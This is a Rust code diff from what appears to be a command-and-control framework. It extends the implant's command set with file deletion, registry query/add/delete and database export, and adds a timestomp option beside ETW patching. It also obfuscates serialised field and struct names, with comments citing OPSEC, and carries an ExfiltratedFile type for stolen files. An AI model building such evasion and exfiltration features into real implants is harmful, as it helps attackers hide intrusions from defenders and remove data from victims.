@@ -2,10 +2,11 @@ use core::panic;
 use serde::{Deserialize, Serialize};
 use std::{
     fmt::{Debug, Display},
-    iter::Enumerate,
     mem::transmute,
     path::PathBuf,
 };
+
+use crate::task_types::{BuildAllBins, FileCopyInner, RegAddInner, RegQueryInner};
 
 /// Commands supported by the implant and C2.
 ///
@@ -37,48 +38,99 @@ pub enum Command {
     Copy,
     /// Moves a file
     Move,
+    /// Removes a file
+    RmFile,
+    /// Removes a directory
+    RmDir,
     /// Pulls a file from the target machine, downloading to the C2
     Pull,
+    RegQuery,
+    RegAdd,
+    RegDelete,
     // This should be totally unreachable; but keeping to make sure we don't get any weird UB, and
     // make sure it is itemised last in the enum
     Undefined,
 }
 
-#[derive(Serialize, Deserialize, Clone, PartialEq, Eq)]
+#[derive(Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct FileDropMetadata {
     pub internal_name: String,
     pub download_name: String,
     pub download_uri: Option<String>,
 }
 
-impl Debug for FileDropMetadata {
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        f.debug_struct("a")
-            .field("b", &self.internal_name)
-            .field("c", &self.download_name)
-            .finish()
-    }
-}
+pub const DELIM_FILE_DROP_METADATA: &str = ",";
 
 impl Into<String> for FileDropMetadata {
     fn into(self) -> String {
-        match serde_json::to_string(&self) {
-            Ok(s) => s,
-            // Note the error case here will cause side effect errors downstream meaning the
-            // command will fail. However, this is rust, and those can at least be dealt with
-            // safely.
-            // Alternatively we can panic, but, I'm not sure that is the best approach, I'd rather
-            // just fail the individual operation than panic.
-            Err(_) => "".into(),
+        //
+        // IMPORTANT:
+        // We serialise the data for FileDropMetadata via a string, delimited by commas.
+        // If we make any changes to FileDropMetadata we need to ensure the below format is free of the
+        // delimiter; AND we need to check that when we deserialise using From<&str> for FileDropMetadata
+        // that we pull out the fields in the same order they are serialised.
+        //
+        // Was facing some issues with the struct name being present in the binary which I couldn't avoid.
+        // The data for this is encoded under the wire, so there should be no network based OPSEC issues with
+        // this approach.
+        //
+
+        // Do some input checks, we cannot contain the delimiter, otherwise panic.
+        assert!(!self.internal_name.contains(DELIM_FILE_DROP_METADATA));
+        assert!(!self.download_name.contains(DELIM_FILE_DROP_METADATA));
+        assert!(
+            !self
+                .download_uri
+                .as_deref()
+                .unwrap_or_default()
+                .contains(DELIM_FILE_DROP_METADATA)
+        );
+
+        format!(
+            "{}{d}{}{d}{}",
+            self.internal_name,
+            self.download_name,
+            self.download_uri.as_deref().unwrap_or_default(),
+            d = DELIM_FILE_DROP_METADATA,
+        )
+    }
+}
+
+impl From<&str> for FileDropMetadata {
+    /// Convert a `&str` to a [`FileDropMetadata`]. The data as a string must be delimited by
+    /// commas, and not contain commas within the substrings.
+    ///
+    /// # Panics
+    /// This function will panic if there are not an exact number of fields which is expected. Aside from bad implementation,
+    /// this would be caused by the delimiter appearing within the encoded substrings.
+    fn from(value: &str) -> Self {
+        //
+        // IMPORTANT
+        // See notes in `impl Into<String> for FileDropMetadata` to make sure we adhere to the rules
+        // around the ordering and content of contained data.
+        //
+
+        let parts: Vec<&str> = value.split(",").collect();
+
+        assert_eq!(parts.len(), 3);
+
+        let download_uri: Option<String> = if parts[2].is_empty() {
+            None
+        } else {
+            Some(parts[2].to_string())
+        };
+
+        Self {
+            internal_name: parts[0].into(),
+            download_name: parts[1].into(),
+            download_uri,
         }
     }
 }
 
-impl TryFrom<&str> for FileDropMetadata {
-    type Error = &'static str;
-
-    fn try_from(value: &str) -> Result<Self, Self::Error> {
-        serde_json::from_str(value).map_err(|_| "")
+impl Into<u32> for Command {
+    fn into(self) -> u32 {
+        self as u32
     }
 }
 
@@ -125,23 +177,18 @@ impl Display for Command {
             Command::Copy => "Copy",
             Command::Move => "Move",
             Command::Pull => "Pull",
+            Command::RegQuery => "reg query",
+            Command::RegAdd => "reg add",
+            Command::RegDelete => "reg del",
+            Command::RmFile => "RmFile",
+            Command::RmDir => "RmDir",
         };
 
         write!(f, "{choice}")
     }
 }
 
-/// The inner type for the [`AdminCommand::Copy`] and [`AdminCommand::Move`], represented as an tuple with
-/// the format (from, to).
-pub type FileCopyInner = (String, String);
-
-/// Represents inner data for the [`AdminCommand::BuildAllBins`], as a tuple for:
-/// (`profile_disk_name`, `save path`, `listener_profile`, `implant_profile`).
-///
-/// For `listener_profile` & `implant_profile`, a value of `None` will resolve to matching on `default`.
-pub type BuildAllBins = (String, String, Option<String>, Option<String>);
-
-#[derive(Serialize, Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone)]
 pub enum AdminCommand {
     Sleep(i64),
     ListAgents,
@@ -164,15 +211,25 @@ pub enum AdminCommand {
     Drop(FileDropMetadata),
     Copy(FileCopyInner),
     Move(FileCopyInner),
+    RmFile(String),
+    RmDir(String),
     /// Pulls a file from the target machine, downloading to the C2
     Pull(String),
     BuildAllBins(BuildAllBins),
+    RegQuery(RegQueryInner),
+    RegAdd(RegAddInner),
+    RegDelete(RegQueryInner),
+    /// Exports the completed tasks database for an agent.
+    ExportDb,
     Undefined,
 }
 
+#[repr(C)]
+#[derive(Serialize)]
 pub struct Task {
     pub id: i32,
     pub command: Command,
+    pub completed_time: i64,
     pub metadata: Option<String>,
 }
 
@@ -182,6 +239,7 @@ impl Task {
             id,
             command,
             metadata,
+            completed_time: 0,
         }
     }
 }
@@ -201,6 +259,7 @@ impl Display for Task {
 }
 
 #[derive(Serialize, Deserialize, Clone, Default)]
+#[serde(rename = "abc")]
 pub struct FirstRunData {
     /// `a` is alias for `cwd`
     pub a: PathBuf,
@@ -215,18 +274,6 @@ pub struct FirstRunData {
     pub d: String,
     /// `e` is an alias for teh `Sleep time` of the agent in seconds
     pub e: u64,
-}
-
-impl Debug for FirstRunData {
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        f.debug_struct("9")
-            .field("a", &self.a)
-            .field("b", &self.b)
-            .field("c", &self.c)
-            .field("d", &self.d)
-            .field("e", &self.e)
-            .finish()
-    }
 }
 
 /// Check whether a list of tasks contains the `KillAgent` [`Command`].
@@ -317,6 +364,7 @@ pub struct NewAgentStaging {
     pub useragent: String,
     pub patch_etw: bool,
     pub jitter: Option<u64>,
+    pub timestomp: Option<String>,
 }
 
 #[derive(Serialize, Deserialize, Copy, Clone, Debug, PartialEq)]
@@ -345,15 +393,22 @@ pub struct FileUploadStagingFromClient {
 }
 
 #[derive(Serialize, Deserialize, Clone)]
+#[serde(rename = "a")]
 pub struct PowershellOutput {
+    #[serde(rename = "b")]
     pub stdout: Option<String>,
+    #[serde(rename = "c")]
     pub stderr: Option<String>,
 }
 
 #[derive(Serialize, Deserialize)]
+#[serde(rename = "a")]
 pub struct ExfiltratedFile {
+    #[serde(rename = "a")]
     pub hostname: String,
+    #[serde(rename = "b")]
     pub file_path: String,
+    #[serde(rename = "c")]
     pub file_data: Vec<u8>,
 }
 
